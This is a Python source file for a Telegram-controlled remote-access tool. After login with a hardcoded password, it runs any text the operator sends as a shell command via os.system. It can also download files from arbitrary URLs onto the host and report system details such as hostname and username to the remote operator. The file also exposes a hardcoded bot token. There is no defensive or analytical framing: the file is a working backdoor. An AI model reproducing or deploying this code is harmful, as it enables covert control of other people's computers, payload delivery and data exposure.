import telebot
import sys
import os
import subprocess
import platform
import getpass
import requests
from config import *

bot = telebot.TeleBot('1655098823:AAHHgy6QiErjDUSpahOH6H9Lj-Cef5X9Xbo')
password = 'password'
global acsess
global admin
global startc
global dst
dst = False
acsess = False
admin = 'None'
startc = False

@bot.message_handler(commands=['admin'])
def login(message):
    global acsess
    global admin
    if message.text.lower() == ('/admin '+password):
        admin = message.from_user.first_name
        acsess = True
        bot.send_message(message.from_user.id, 'Hello My Owner!')

@bot.message_handler(commands=['id'])
def id(message):
    global acsess
    if acsess:
        bot.send_message(message.from_user.id, message.from_user.id)

@bot.message_handler(commands=['stop'])
def stop(message):
    global acsess
    if acsess:
        bot.stop_bot()
    if not acsess:
        bot.send_message(message.from_user.id, 'No permission👺')

@bot.message_handler(commands=['startc'])
def start_command(message):
    global acsess
    global startc
    if acsess:
        startc = True
        bot.send_message(message.from_user.id, 'Console launched! You can send commands')
        bot.send_message(message.from_user.id, 'IF YOU WANT TO USE CMD COMMAND, USE [cmd /c (command)]')

@bot.message_handler(commands=['stopc'])
def stop_command(message):
    global acsess
    global startc
    if acsess:
        startc = False
        bot.send_message(message.from_user.id, 'Console Stoped!')

@bot.message_handler(commands=['help'])
def help(message):
    global acsess
    if acsess:
        bot.send_message(message.from_user.id, 'stop - stop script startc/stopc - start/stop console help - this message admin - login printsc - screenshot ~ - change dir(please use \ but not /. and dont use 4)')

@bot.message_handler(content_types=['text'])
def console(message):
    global acsess
    if acsess:
        global startc
        cmd = message.text.lower()
        cmd = cmd.split(' ')
        try:
            if startc:
                if cmd[0] == 'cd':
                    os.chdir(cmd[1])
                    bot.send_message(message.from_user.id, 'DIRECTORY = '+os.getcwd())
                    cd = False
                elif cmd[0] == "list":
                    bot.send_message(message.from_user.id, str(os.listdir(".")))
                elif cmd[0] == "sysinfo":
                    sysinfo = f"""
        Operating System: {platform.system()}
        Computer Name: {platform.node()}
        Username: {getpass.getuser()}
        Release Version: {platform.release()}
        Processor Architecture: {platform.processor()}
                    """
                    bot.send_message(message.from_user.id, sysinfo)
                elif cmd[0] == 'mkdir':
                    os.system('mkdir ' + cmd[1])
                    bot.send_message(message.from_user.id, 'NEW DIR CREATE - '+cmd[1])
                elif cmd[0] == 'upload':
                    f=open(cmd[2], "wb")
                    ufr = requests.get(cmd[1])
                    f.write(ufr.content)
                    f.close()
                    bot.send_message(message.from_user.id, 'UPLOADED')
                elif cmd[0] == 'pwd':
                    bot.send_message(message.from_user.id, os.getcwd())
                else:
                    os.system(message.text.lower())
        except:
            bot.send_message(message.from_user.id, 'FAIL')

bot.polling(none_stop=True)
    